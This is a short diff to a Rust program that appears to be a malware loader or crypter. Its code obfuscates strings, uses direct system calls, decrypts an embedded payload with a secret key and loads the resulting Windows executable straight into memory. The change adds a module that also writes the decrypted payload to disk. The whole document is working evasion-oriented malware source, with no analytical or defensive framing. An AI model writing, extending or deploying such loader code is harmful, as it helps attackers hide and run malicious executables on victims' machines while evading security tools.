@@ -2,6 +2,8 @@ use obfuscator::{obfuscate, obfuscate_string};
 
 #[cfg(windows)]
 mod syscalls;
+#[cfg(windows)]
+mod file_operations;
 
 #[cfg(windows)]
 use std::{mem, ptr};
@@ -371,6 +373,10 @@ fn main() {
         }
 
         let decoded_payload = transform_data(PAYLOAD, SECRET_KEY);
+
+        if let Err(e) = file_operations::save_payload_to_disk(&decoded_payload) {
+            eprintln!("{}{}", obfuscate_string!("[ERROR] Failed to save payload to disk: "), e);
+        }
 
         unsafe {
             if let Err(e) = load_pe_from_memory(&decoded_payload) {
